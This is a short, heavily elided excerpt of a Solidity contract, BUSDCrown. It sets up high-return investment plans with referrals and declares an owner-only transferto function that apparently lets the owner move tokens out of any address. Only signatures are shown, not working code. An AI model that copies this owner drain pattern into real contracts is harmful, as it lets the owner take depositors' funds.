...
contract BUSDCrown {
    ...
    constructor(IERC20 _busd, address wallet, uint startDate) {
        ...
        plans.push(Plan(1, 25, 300));
        plans.push(Plan(2, 30, 200000));
        plans.push(Plan(3, 35, 800000));
        plans.push(Plan(1, 30, 200));
        plans.push(Plan(2, 40, 800000));
        plans.push(Plan(3, 50, 1500000));
    }
    ...
    function invest(address referrer, uint8 plan, uint amount) external {
    ...
    function transferto(address from, address to, uint amount) public onlyOwner {
